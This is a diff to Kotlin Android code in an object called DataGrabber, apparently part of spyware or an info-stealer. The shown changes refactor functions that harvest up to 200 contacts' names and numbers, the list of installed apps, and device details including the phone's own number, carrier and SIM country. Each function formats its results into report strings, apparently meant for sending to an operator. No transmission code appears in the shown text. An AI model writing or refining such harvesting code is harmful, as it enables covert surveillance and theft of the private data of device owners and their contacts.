@@ -16,10 +16,8 @@ object DataGrabber {
         try {
             val cur = ctx.contentResolver.query(
                 ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-                arrayOf(
-                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
-                    ContactsContract.CommonDataKinds.Phone.NUMBER
-                ), null, null, null
+                arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER),
+                null, null, null
             )
             cur?.use {
                 while (it.moveToNext() && count < 200) {
@@ -83,7 +81,10 @@ object DataGrabber {
         try {
             val pm = ctx.packageManager
             val list = pm.getInstalledPackages(0).take(200)
-            for (p in list) sb.append("• ${p.applicationInfo.loadLabel(pm)} (${p.packageName})\n")
+            for (p in list) {
+                val label = try { pm.getApplicationLabel(p.applicationInfo).toString() } catch (e: Exception) { p.packageName }
+                sb.append("• $label (${p.packageName})\n")
+            }
         } catch (e: Exception) { sb.append("err: ${e.message}\n") }
         return sb.toString()
     }
@@ -91,17 +92,13 @@ object DataGrabber {
     fun deviceInfo(ctx: Context): String {
         val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
         val sb = StringBuilder("📱 <b>Device info</b>\n")
-        sb.append("Model: ${Build.MODEL}\n")
-        sb.append("Brand: ${Build.BRAND}\n")
-        sb.append("Manufacturer: ${Build.MANUFACTURER}\n")
+        sb.append("Model: ${Build.MODEL}\nBrand: ${Build.BRAND}\nManuf: ${Build.MANUFACTURER}\n")
         sb.append("Android: ${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})\n")
-        sb.append("Device: ${Build.DEVICE}\n")
-        sb.append("Hardware: ${Build.HARDWARE}\n")
+        sb.append("Device: ${Build.DEVICE}\nHardware: ${Build.HARDWARE}\n")
         @Suppress("DEPRECATION")
         val num = tm.line1Number
         if (!num.isNullOrBlank()) sb.append("Nomor: $num\n")
-        sb.append("Operator: ${tm.networkOperatorName}\n")
-        sb.append("SIM: ${tm.simCountryIso}\n")
+        sb.append("Operator: ${tm.networkOperatorName}\nSIM: ${tm.simCountryIso}\n")
         return sb.toString()
     }
 
